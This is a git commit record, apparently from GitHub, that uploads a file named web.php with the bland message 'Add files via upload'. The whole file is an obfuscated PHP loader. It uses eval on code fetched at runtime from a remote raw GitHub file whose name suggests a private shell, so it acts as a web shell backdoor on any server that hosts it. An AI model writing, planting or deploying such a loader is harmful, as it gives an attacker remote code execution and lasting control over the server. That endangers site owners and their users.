8a9f467b8d5c1624805912e07de4b13be0434bd3
ohctcombet <154842409+ohctcombet@users.noreply.github.com>
2024-01-24 13:40:05 +0700

    Add files via upload

---
+++ web.php
@@ -0,0 +1,8 @@
+<?php eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://github.com/ohctcombet/ky/raw/main/pr1vxsh3el.txt"
+            )
+        )
+); ?>
